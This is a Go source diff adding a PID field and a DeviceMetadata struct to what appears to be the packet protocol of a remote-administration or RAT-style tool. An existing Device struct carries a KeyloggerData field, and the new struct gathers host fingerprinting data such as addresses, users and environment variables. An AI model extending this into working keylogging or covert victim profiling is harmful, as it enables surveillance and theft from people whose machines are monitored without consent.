@@ -34,6 +34,7 @@ type Device struct {
 	Hostname string `json:"hostname"`
 	Username string `json:"username"`
 	ClientUptime int64 `json:"clientuptime"`
+	PID          int   `json:"pid"`
 	KeyloggerData []string `json:"keyloggerdata"`
 	KeyboardLayout string `json:"keyboardlayout"`
 }
@@ -56,6 +57,47 @@ type CPU struct {
 type Net struct {
 	Sent uint64 `json:"sent"`
 	Recv uint64 `json:"recv"`
+}
+
+type NetworkInterface struct {
+	Name  string   `json:"name"`
+	MAC   string   `json:"mac"`
+	Flags []string `json:"flags"`
+	Addrs []string `json:"addrs"`
+}
+
+type DeviceMetadata struct {
+	// Identity
+	ID       string `json:"id"`
+	Hostname string `json:"hostname"`
+	Username string `json:"username"`
+	// OS / platform
+	OS              string `json:"os"`
+	Arch            string `json:"arch"`
+	Platform        string `json:"platform"`
+	PlatformFamily  string `json:"platform_family"`
+	PlatformVersion string `json:"platform_version"`
+	KernelVersion   string `json:"kernel_version"`
+	BootTime        uint64 `json:"boot_time"`
+	Timezone        string `json:"timezone"`
+	Virtualization  string `json:"virtualization"`
+	// Network
+	WAN        string             `json:"wan"`
+	LAN        string             `json:"lan"`
+	Interfaces []NetworkInterface `json:"interfaces"`
+	// Hardware
+	CPU  CPU    `json:"cpu"`
+	RAM  IO     `json:"ram"`
+	Disk IO     `json:"disk"`
+	MAC  string `json:"mac"`
+	// Client runtime
+	PID          int    `json:"pid"`
+	ClientUptime int64  `json:"client_uptime"`
+	Commit       string `json:"commit"`
+	// Logged-in users
+	Users []string `json:"users"`
+	// Selected environment variables
+	Env map[string]string `json:"env"`
 }
 
 func (p *Packet) GetData(key string, t reflect.Kind) (any, bool) {
